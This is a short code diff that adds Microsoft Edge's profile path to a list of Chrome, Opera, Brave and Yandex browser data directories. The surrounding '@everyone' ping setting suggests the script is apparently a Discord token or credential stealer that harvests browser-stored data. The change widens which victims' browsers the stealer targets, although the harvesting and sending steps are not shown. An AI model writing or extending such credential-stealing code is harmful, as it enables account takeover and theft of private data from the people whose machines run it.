@@ -36,7 +36,8 @@ def main():
         'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
         'Opera': roaming + '\\Opera Software\\Opera Stable',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+        'Edge': local + '\\Microsoft\\Edge\\User Data\\Default'
     }
 
     message = '@everyone' if PING_ME else ''
